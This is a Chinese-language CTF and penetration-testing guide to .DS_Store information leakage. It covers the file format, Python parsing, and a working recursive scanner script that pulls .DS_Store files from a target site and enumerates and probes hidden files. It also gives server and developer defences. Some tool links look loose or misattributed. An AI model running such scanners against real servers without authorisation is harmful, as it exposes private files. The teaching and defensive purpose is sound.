# .DS_Store 文件解析指南（CTF）

> .DS_Store (Desktop Services Store) 是 macOS 系统自动创建的隐藏文件，用于存储文件夹的自定义属性。在 CTF 中常被用作信息泄露漏洞。

---

## 目录
1. [概述](#概述)
2. [.DS_Store 结构](#ds_store-结构)
3. [解析方法](#解析方法)
4. [CTF 利用场景](#ctf-利用场景)
5. [自动化工具](#自动化工具)
6. [实战案例](#实战案例)
7. [防御措施](#防御措施)

---

## 概述

### .DS_Store 是什么？

.DS_Store 文件由 macOS Finder 自动生成，存储:
- 文件和文件夹的图标位置
- 背景图片设置
- 窗口大小和位置
- 排序方式
- **文件和目录名称** ⚠️

### CTF 中的价值

在 Web 服务器上泄露的 .DS_Store 可以:
- 🔍 发现隐藏的文件和目录
- 📂 重建目录结构
- 🚩 找到 flag 文件的路径
- 🔑 发现备份文件、配置文件

---

## .DS_Store 结构

### 文件格式

.DS_Store 使用 Binary Search Tree (B-Tree) 结构存储键值对:

```
Header (32 bytes)
├── Magic Number: 0x00000001
├── Magic Bytes: "Bud1"
├── Allocator Offset
└── Allocator Size

Body (B-Tree 结构)
├── Internal Nodes
└── Leaf Nodes
    ├── Filename
    ├── Structure ID
    └── Data Type
```

### 常见的记录类型

```
BKGD - 背景图片信息
Iloc - 图标位置
LSVO - 列表视图选项
bwsp - 窗口大小和位置
```

---

## 解析方法

### 方法1: 使用 Python 解析

#### 安装工具

```bash
# 方法A: 使用 ds_store 库
pip install ds_store

# 方法B: 使用 python-dsstore
pip install python-dsstore
```

#### 基础解析

```python
from ds_store import DSStore

# 打开 .DS_Store 文件
with DSStore.open('.DS_Store', 'r+') as ds:
    # 遍历所有条目
    for entry in ds:
        print(f"文件名: {entry.filename}")
        print(f"类型: {entry.type}")
        print(f"代码: {entry.code}")
        print(f"值: {entry.value}")
        print("-" * 50)
```

#### 提取文件名列表

```python
from ds_store import DSStore

def extract_filenames(ds_store_path):
    """提取 .DS_Store 中的所有文件名"""
    filenames = set()

    try:
        with DSStore.open(ds_store_path, 'r+') as ds:
            for entry in ds:
                if entry.filename and entry.filename != '.':
                    filenames.add(entry.filename)

        return sorted(filenames)

    except Exception as e:
        print(f"错误: {e}")
        return []

# 使用
files = extract_filenames('.DS_Store')
print("发现的文件:")
for f in files:
    print(f"  - {f}")
```

### 方法2: 使用在线工具

#### DSStoreParser (推荐)

```bash
# GitHub: https://github.com/gehaxelt/Python-dsstore

# 克隆仓库
git clone https://github.com/gehaxelt/Python-dsstore.git
cd Python-dsstore

# 解析文件
python dsstore.py /path/to/.DS_Store
```

#### 在线解析器

- **DSStoreParser Online**: https://www.aconvert.com/
- **KALI Linux - dsstore**: 自带工具

### 方法3: 使用命令行工具

#### dsstore 命令

```bash
# 安装
pip install ds_store

# 列出所有条目
dsstore list .DS_Store

# 导出为 JSON
dsstore export .DS_Store output.json

# 删除特定条目
dsstore delete .DS_Store filename
```

#### ds_store_exp (推荐用于 CTF)

```bash
# 安装
git clone https://github.com/lijiejie/ds_store_exp.git
cd ds_store_exp

# 解析本地文件
python ds_store_exp.py .DS_Store

# 解析远程 URL
python ds_store_exp.py http://example.com/.DS_Store
```

---

## CTF 利用场景

### 场景1: Web 目录泄露

#### 发现 .DS_Store

```bash
# 常见的泄露路径
http://example.com/.DS_Store
http://example.com/admin/.DS_Store
http://example.com/uploads/.DS_Store
http://example.com/backup/.DS_Store
```

#### 下载并解析

```bash
# 下载
wget http://example.com/.DS_Store

# 解析
python3 << 'EOF'
from ds_store import DSStore

with DSStore.open('.DS_Store', 'r+') as ds:
    for entry in ds:
        if entry.filename != '.':
            print(entry.filename)
EOF
```

### 场景2: 递归目录发现

```python
import requests
from ds_store import DSStore
import os

def recursive_ds_store_scan(base_url, path=''):
    """递归扫描 .DS_Store 并发现所有文件"""
    ds_url = f"{base_url}{path}/.DS_Store"

    try:
        # 下载 .DS_Store
        response = requests.get(ds_url, timeout=5)
        if response.status_code == 200:
            # 保存到临时文件
            temp_file = f'temp_{path.replace("/", "_")}.DS_Store'
            with open(temp_file, 'wb') as f:
                f.write(response.content)

            # 解析
            with DSStore.open(temp_file, 'r+') as ds:
                for entry in ds:
                    if entry.filename and entry.filename != '.':
                        full_path = f"{path}/{entry.filename}"
                        print(f"[+] 发现: {full_path}")

                        # 如果是目录，递归扫描
                        # 注意：需要其他方式判断是否为目录
                        # 这里简化处理

            os.remove(temp_file)

    except Exception as e:
        print(f"[-] {path}: {e}")

# 使用
recursive_ds_store_scan('http://example.com')
```

### 场景3: 构建目录树

```python
from ds_store import DSStore
import json

def build_directory_tree(ds_store_path):
    """从 .DS_Store 构建目录树"""
    tree = {
        'files': [],
        'directories': []
    }

    try:
        with DSStore.open(ds_store_path, 'r+') as ds:
            for entry in ds:
                if entry.filename and entry.filename != '.':
                    # 根据类型分类
                    if '.' in entry.filename:
                        tree['files'].append(entry.filename)
                    else:
                        tree['directories'].append(entry.filename)

    except Exception as e:
        print(f"错误: {e}")

    return tree

# 使用
tree = build_directory_tree('.DS_Store')
print(json.dumps(tree, indent=2, ensure_ascii=False))
```

### 场景4: 查找 Flag 文件

```python
from ds_store import DSStore
import re

def find_flag_files(ds_store_path):
    """在 .DS_Store 中查找可能包含 flag 的文件"""
    flag_patterns = [
        r'flag',
        r'key',
        r'secret',
        r'password',
        r'\.txt$',
        r'\.zip$',
        r'backup',
        r'admin'
    ]

    potential_flags = []

    try:
        with DSStore.open(ds_store_path, 'r+') as ds:
            for entry in ds:
                if entry.filename and entry.filename != '.':
                    # 检查是否匹配 flag 模式
                    for pattern in flag_patterns:
                        if re.search(pattern, entry.filename, re.IGNORECASE):
                            potential_flags.append(entry.filename)
                            break

    except Exception as e:
        print(f"错误: {e}")

    return list(set(potential_flags))

# 使用
flags = find_flag_files('.DS_Store')
print("可能的 flag 文件:")
for f in flags:
    print(f"  🚩 {f}")
```

---

## 自动化工具

### 完整的 CTF 利用脚本

```python
#!/usr/bin/env python3
"""
.DS_Store CTF 利用工具
自动化发现和下载泄露的文件
"""

import requests
from ds_store import DSStore
import os
import sys
from urllib.parse import urljoin

class DSStoreExploiter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.discovered_files = []

    def download_ds_store(self, path=''):
        """下载 .DS_Store 文件"""
        ds_url = urljoin(self.base_url + path, '.DS_Store')

        try:
            response = requests.get(ds_url, timeout=10)
            if response.status_code == 200:
                return response.content
        except:
            pass

        return None

    def parse_ds_store(self, content):
        """解析 .DS_Store 内容"""
        temp_file = 'temp.DS_Store'

        try:
            with open(temp_file, 'wb') as f:
                f.write(content)

            files = []
            with DSStore.open(temp_file, 'r+') as ds:
                for entry in ds:
                    if entry.filename and entry.filename != '.':
                        files.append(entry.filename)

            os.remove(temp_file)
            return files

        except Exception as e:
            print(f"解析错误: {e}")
            if os.path.exists(temp_file):
                os.remove(temp_file)
            return []

    def exploit(self, path='', depth=0, max_depth=3):
        """递归利用 .DS_Store 泄露"""
        if depth > max_depth:
            return

        print(f"{'  ' * depth}[*] 扫描: {self.base_url}{path}")

        # 下载 .DS_Store
        content = self.download_ds_store(path)
        if not content:
            return

        # 解析文件列表
        files = self.parse_ds_store(content)

        for filename in files:
            full_path = f"{path}/{filename}"
            full_url = self.base_url + full_path

            print(f"{'  ' * depth}[+] 发现: {filename}")
            self.discovered_files.append(full_url)

            # 尝试下载文件
            try:
                response = requests.head(full_url, timeout=5)
                if response.status_code == 200:
                    print(f"{'  ' * depth}    ✓ 可访问")

                    # 如果是目录，递归扫描
                    if 'text/html' in response.headers.get('Content-Type', ''):
                        self.exploit(full_path, depth + 1, max_depth)

            except:
                pass

    def save_results(self, output_file='discovered_files.txt'):
        """保存发现的文件列表"""
        with open(output_file, 'w') as f:
            for url in self.discovered_files:
                f.write(url + '\n')

        print(f"\n[+] 保存结果到: {output_file}")
        print(f"[+] 总共发现: {len(self.discovered_files)} 个文件")

def main():
    if len(sys.argv) < 2:
        print("用法: python3 ds_exploit.py <URL>")
        print("示例: python3 ds_exploit.py http://example.com")
        sys.exit(1)

    target_url = sys.argv[1]

    print("="*60)
    print(".DS_Store CTF 利用工具")
    print("="*60)
    print(f"目标: {target_url}\n")

    exploiter = DSStoreExploiter(target_url)
    exploiter.exploit()
    exploiter.save_results()

    print("\n下一步:")
    print("1. 检查 discovered_files.txt")
    print("2. 下载可疑文件")
    print("3. 查找 flag")

if __name__ == '__main__':
    main()
```

### 使用方法

```bash
# 保存脚本
chmod +x ds_exploit.py

# 运行
python3 ds_exploit.py http://target.com

# 批量下载发现的文件
cat discovered_files.txt | xargs -I {} wget {}
```

---

## 实战案例

### 案例1: 简单的 Flag 泄露

```bash
# 访问目标
curl http://challenge.com/.DS_Store -o .DS_Store

# 解析
python3 -c "
from ds_store import DSStore
with DSStore.open('.DS_Store', 'r+') as ds:
    for e in ds:
        print(e.filename)
"

# 输出:
# flag.txt
# index.php
# admin.php

# 获取 flag
curl http://challenge.com/flag.txt
```

### 案例2: 多层目录结构

```python
# 扫描脚本
import requests
from ds_store import DSStore

base = 'http://challenge.com'
paths = ['', '/admin', '/uploads', '/backup']

for path in paths:
    url = f'{base}{path}/.DS_Store'
    try:
        r = requests.get(url)
        if r.status_code == 200:
            with open('temp.DS_Store', 'wb') as f:
                f.write(r.content)

            with DSStore.open('temp.DS_Store', 'r+') as ds:
                print(f"\n[+] {path}:")
                for e in ds:
                    if e.filename != '.':
                        print(f"  - {e.filename}")
    except:
        pass
```

### 案例3: 源代码泄露

```bash
# 发现备份目录
# .DS_Store 显示: backup.zip

# 下载
wget http://challenge.com/backup.zip

# 解压
unzip backup.zip

# 审计源码找漏洞
grep -r "flag" .
```

---

## 防御措施

### 服务器端防御

#### Nginx 配置

```nginx
# 禁止访问 .DS_Store
location ~ /\.DS_Store$ {
    deny all;
    return 404;
}

# 禁止访问所有隐藏文件
location ~ /\. {
    deny all;
    return 404;
}
```

#### Apache 配置

```apache
# .htaccess
<FilesMatch "^\.DS_Store$">
    Require all denied
</FilesMatch>

# 或
<DirectoryMatch "^\.|\/\.">
    Require all denied
</DirectoryMatch>
```

### 开发端防御

#### 删除 .DS_Store

```bash
# 删除当前目录及子目录的所有 .DS_Store
find . -name .DS_Store -type f -delete

# 添加到 .gitignore
echo ".DS_Store" >> .gitignore

# 禁止 Finder 生成 .DS_Store (仅限网络卷)
defaults write com.apple.desktopservices DSDontWriteNetworkStores true
```

#### Git 预提交钩子

```bash
#!/bin/bash
# .git/hooks/pre-commit

# 检查是否有 .DS_Store
if git diff --cached --name-only | grep -q "\.DS_Store$"; then
    echo "错误: 尝试提交 .DS_Store 文件"
    echo "运行: find . -name .DS_Store -type f -delete"
    exit 1
fi
```

---

## 工具清单

### Python 库
```bash
pip install ds_store          # 基础解析
pip install python-dsstore    # 另一个实现
```

### 命令行工具
```bash
# ds_store_exp (推荐)
git clone https://github.com/lijiejie/ds_store_exp.git

# DSStoreParser
git clone https://github.com/gehaxelt/Python-dsstore.git
```

### 在线工具
- DSStore Explorer: https://apps.apple.com/
- HexFiend: 十六进制编辑器

---

## 参考资源

### 技术文档
- **Wiki**: https://en.wikipedia.org/wiki/.DS_Store
- **格式规范**: https://formats.kaitai.io/ds_store/

### CTF Write-ups
- **CTFtime**: https://ctftime.org/ (搜索 "DS_Store")
- **GitHub**: https://github.com/topics/ds-store

### 安全研究
- **OWASP**: Information Disclosure
- **CWE-538**: File and Directory Information Exposure

---

**文档版本**: v1.0
**更新日期**: 2025-01
**适用场景**: CTF、渗透测试、安全审计
